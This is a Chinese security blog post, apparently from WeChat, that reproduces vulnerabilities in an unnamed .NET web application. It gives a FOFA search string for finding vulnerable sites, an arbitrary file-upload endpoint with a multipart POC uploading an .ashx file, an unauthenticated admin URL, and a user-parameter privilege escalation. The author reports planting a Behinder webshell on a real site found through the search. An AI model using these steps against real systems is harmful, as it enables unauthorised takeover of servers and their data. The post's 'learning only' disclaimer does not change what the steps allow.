> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484741&idx=1&sn=62989d6b4d1540a8ec829f665e42e033&chksm=c07fbeb1f70837a7577a86d3687a8c8fa177eb5115e14b7fe0727b80021baaad6378b3a62c76&scene=132#wechat_redirect)

_**前言**_

  

 **声明：本次测试只作为学习用处，请勿未授权进行渗透测试，****切勿用于它用途！**

_**_**Part.1**_ 漏洞详情**_

  

月球师傅掏出了自己的大宝贝，甩了出来，猫猫有什么坏心思呢~~

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFW8SuWurpoicZqquXm7oVfoSRqCK3P859DQ7eibsW0KDpZEGwL1MxaBp8w/640?wx_fmt=png)

FoFA 语法:

/Widget/common/Service/CommonWidgetService.asmx/Categorylist

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWibG8jsD0DzyGhRicnvzUCstgzyr1DUZ9PMwIlNo6box7rTlaFib1lWibcg/640?wx_fmt=png)

漏洞位置

/SmartMobile/micropage/UpLoad/FilesUpLoadHandler.ashx

**任意文件上传：**

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWApRzdagM3zibdNt0fKEviaib9mTXBtFQwdxU9YSRgfHv46J2k5SibibOHsw/640?wx_fmt=png)

返回就是存在

构造 POC

```
Post:
 
------WebKitFormBoundaryxJBEcLK1xdylqBhP
Content-Disposition: form-data;
 
2222.ashx
------WebKitFormBoundaryxJBEcLK1xdylqBhP
Content-Disposition: form-data;
Content-Type: image/jpeg
 
------WebKitFormBoundaryxJBEcLK1xdylqBhP—
```

通过构造的 POC 成功上传文件，并返回上传成功后的路径。

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWMIZt0mDibw6SF3daW1ApsseOCr2jDeQ82nSboWKlUqZkm326nrH4yXA/640?wx_fmt=png)

**未授权访问**

/SmartMobile/MobileIndex.aspx?uname=admin&orgId=0

访问连接直接跳转到管理员（有的需要登录有的则不要）

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWYQpNrzXs9LRAWFX304mdEH12EZQdwys9NXeiccmIM6WV4yCPP35yUog/640?wx_fmt=png)

需要登录的提示绑定账号，这时候需要注册一个账号登录。

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWCFwiaS8OScpVHuARicOn4ibGQBN5WMRqlT8stNia0DumAwDg6VynWibcL7w/640?wx_fmt=png)

**提供一次任意用户注册**

用户注册链接: Module/SSO/SJS_Register.aspx

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFW3ZmpfNEMibmgpDcsHYqTzejMqibJ6dDuBBc7YS1IibmuKSmAdmyruxv4A/640?wx_fmt=png)

_**_**Part.2 漏洞复现**_**_

  

找到同类型的站点，访问并注册一个账号

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFW7SiaSIMiannrmCR7PK0siaXYxJYuric8Aicqdiajk0AGbNqBnBon6AkWTGGA/640?wx_fmt=png)

 注册成功后，登录到用户主页，可以看到开放了许多的功能。

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWhvA9QIwUDiaibw82ngOrfGer1XicesPLfNNPw1t3NERKFxSibSWel2rT2A/640?wx_fmt=png)

访问到个人中心

可以看到这个 URL 通过 GET 的方式传递 user 参数

http://xxx.xxx.xxx/Module/PersonalCenter/Default.aspx?user=test123

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWktKWY3AiccRDzOj8L04PIVXQP5SXsXaYprhI29sORXtSnSv2fgQFwKQ/640?wx_fmt=png)

修改 user=admin，发现界面发生变化，用户变为管理员

http://xxx.xxx.xxx/Module/PersonalCenter/Default.aspx?user=admin

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWTVOib4SuQ1faicCOoEoeibrNRBD0S5QIjzyqTORKbAUa91w5Da6eSSJrQ/640?wx_fmt=png)

在访问

http://xxx.xxx.xxx/SmartMobile/MobileIndex.aspx?uname=admin&orgId=0

到达管理员后台管理界面

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWbleeJCMWYb350iaelIrZSapPJ8eJ0P4Ciaicfr2GG7n6Sia9wUYxsxpOgA/640?wx_fmt=png)

找到图片上传的位置，上传图片，修改 fileType 的参数，发现此处没有任何过滤，

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWDmWKZKdibf0iaszjQviaI8LnzKVDt4H2xVWUGXeWKFgDCPeGZHhiaQ3q8g/640?wx_fmt=png)

 冰蝎上传成功，复现成功。

![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGZec2eaTlnicX8uDNhP2PNFWxP4VHHfv9YOtR04slIhX9Hc59dWfZQqxWJx0DxOIIZDscAQ3lK0Vmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/z1BDHniaudwlfmWtOG25nMTy7Rm8fr8FiaZGaNFeOjQK1wfqWpcrZc3TPvRmyYN2r2qC8JFGuMFEXobVMYp9hQzQ/640?wx_fmt=gif)

扫码二维码

获取更多姿势

F12sec

![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGZjT4wKhhUiaY0Vfb11FayFhDumgDvFHln8q6rttXdllugQU7ibcLLOxp5H581iayytcnXEPwibEO8yqw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/eHpJZ2bXAXdly9aB5q6xe9xjE66TzF3GbwhdOYtfUyyejGYeOcS7L6yn8WP1LflIANPiafT4h0kghD7MGhJkqAA/640?wx_fmt=png)

  

往期推荐  

[漏洞复现 | 记一次通用漏洞 0](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484651&idx=1&sn=68bffd56745db9fbf44408efa577b48d&chksm=c07fbf1ff7083609ab12ca47197cd771482c3c0189e07aa19163830251c6b1da47287db06a0a&scene=21#wechat_redirect)  
[实战 | 记一次利用 mssql 上线](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484628&idx=1&sn=2345aec9a4550a194dc5a28b0c5cd496&chksm=c07fbf20f708363614e51e5525c1aad9b4c8f5a50b391b0c83f11d1073a26d7bb8f4dc3a9fc8&scene=21#wechat_redirect)

[实战 | 利用无线渗透加内网渗透进行钓妹子 (上篇)](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247484701&idx=1&sn=39a82092e0c16d219b50d5ecd1274674&chksm=c07fbee9f70837ffe6f35b87bea98da39379b1e94d5cb4ce0cbc18c2b008b1bcef20954aefb6&scene=21#wechat_redirect)